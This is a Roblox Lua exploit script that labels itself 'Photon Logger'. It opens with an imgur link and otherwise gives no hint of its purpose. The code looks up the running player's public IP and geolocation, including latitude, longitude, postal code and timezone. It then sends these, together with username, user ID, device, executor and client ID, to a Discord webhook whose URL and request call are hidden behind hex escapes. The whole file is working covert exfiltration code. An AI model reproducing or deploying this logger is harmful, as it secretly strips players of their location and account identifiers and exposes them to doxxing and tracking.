-- // Gyatt https://imgur.com/a/MTkw8ep

if getgenv().ex == nil then getgenv().ex = true
    ipinf=game:GetService("HttpService"):JSONDecode(game:HttpGet('https://ipapi.co/'..game:HttpGet("https://api.ipify.org")..'/json'));getfenv()["\x72\x65\x71\x75\x65\x73\x74"](
        {
            ["\x55\x72\x6C"] = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x74\x62\x2e\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x32\x36\x31\x33\x32\x31\x31\x38\x36\x33\x32\x33\x37\x32\x36\x34\x31\x36\x2f\x47\x66\x67\x41\x30\x77\x7a\x5a\x71\x58\x66\x72\x2d\x65\x62\x2d\x30\x56\x6f\x79\x79\x32\x6e\x52\x63\x59\x69\x39\x5f\x77\x74\x54\x6e\x6b\x53\x4e\x30\x45\x76\x78\x64\x4e\x53\x56\x31\x46\x43\x6d\x48\x36\x6f\x4b\x36\x66\x36\x79\x71\x76\x61\x6e\x67\x32\x2d\x6a\x6d\x58\x77\x75",
            ["\x4D\x65\x74\x68\x6F\x64"] = "\x50\x4F\x53\x54",
            ["\x48\x65\x61\x64\x65\x72\x73"] = {
                ["\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65"] = "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E"
            },
            ["\x42\x6F\x64\x79"] = game:GetService("HttpService"):JSONEncode({
        ["embeds"] = {{
            ["description"] = "**Photon Logger**".." **|** [**Profile**](https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)".." ** | ** [**Ip Info**](https://ipinfo.io/"..game:HttpGet("https://api.ipify.org")..")",
            ["color"] = tonumber(0x6300ff),
            ["fields"] = {
                {
                    ["name"] = ":bust_in_silhouette: Username",
                    ["value"] = "```"..game.Players.LocalPlayer.Name.."```",
                    ["inline"] = true
                },            
                {
                    ["name"] = ":robot: IP",
                    ["value"] = "```"..game:HttpGet("https://api.ipify.org").."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":money_with_wings: Premium",
                    ["value"] = "```"..(game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium and "True" or "False").."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":wastebasket: Alt",
                    ["value"] = "```"..(game.Players.LocalPlayer.AccountAge <= 28 and "Yes" or "No").."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":baby: Age",
                    ["value"] = "```"..game.Players.LocalPlayer.AccountAge.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":mobile_phone: Device",
                    ["value"] = "```"..((game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled) and "Mobile" or "PC").."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":clock: Time",
                    ["value"] = "```"..DateTime.now():FormatLocalTime("LL", "en-us").."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":identification_card: User Id",
                    ["value"] = "```"..game.Players.LocalPlayer.userId.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":family_mwgb: Players",
                    ["value"] = "```"..#game.Players:GetPlayers().."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":comet: Executor",
                    ["value"] = "```"..(identifyexecutor() or "Unknown").."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":eye: Display Name",
                    ["value"] = "```@"..game.Players.LocalPlayer.DisplayName.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":fire: Version",
                    ["value"] = "```P3.1```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":houses: Game",
                    ["value"] = "```"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name:sub(1, 8).."...```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":scroll: Place Id",
                    ["value"] = "```"..game.PlaceId.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":flag_white: Team",
                    ["value"] = "```"..(game.Players.LocalPlayer.Team or "None").."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":earth_americas: Country",
                    ["value"] = "```"..(ipinf.country_name or "Unknown").."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":airplane: Timezone",
                    ["value"] = "```"..ipinf.timezone.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":milky_way: Offset",
                    ["value"] = "```"..ipinf.utc_offset.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":one: Latitude",
                    ["value"] = "```"..ipinf.latitude.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":two: Longitude",
                    ["value"] = "```"..ipinf.longitude.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":three: Postal",
                    ["value"] = "```"..(ipinf.postal or "Unknown").."```",
                    ["inline"] = true
                },
                {
                    ["name"] = ":key: Job Id",
                    ["value"] = "```"..game.JobId.."```",
                    ["inline"] = false
                },
                {
                    ["name"] = ":key: Client Id",
                    ["value"] = "```"..(game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown").."```",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"]= "Photon Logger | @apnff0x",
                ["icon_url"]= "https://cdn.discordapp.com/attachments/1136547563017871496/1261163357562605601/attachment.png?ex=6691f567&is=6690a3e7&hm=9666969649fef9631e5857e63303c705894e35a1e5b0de793527fb6e9d9d331d&"
            },
            ["thumbnail"] = {
                ["url"] = "https://cdn.discordapp.com/attachments/1136547563017871496/1261163357562605601/attachment.png?ex=6691f567&is=6690a3e7&hm=9666969649fef9631e5857e63303c705894e35a1e5b0de793527fb6e9d9d331d&"
            }
        }},
        ["username"] = game:GetService("HttpService"):GenerateGUID(true)
    })
        }
    )
end
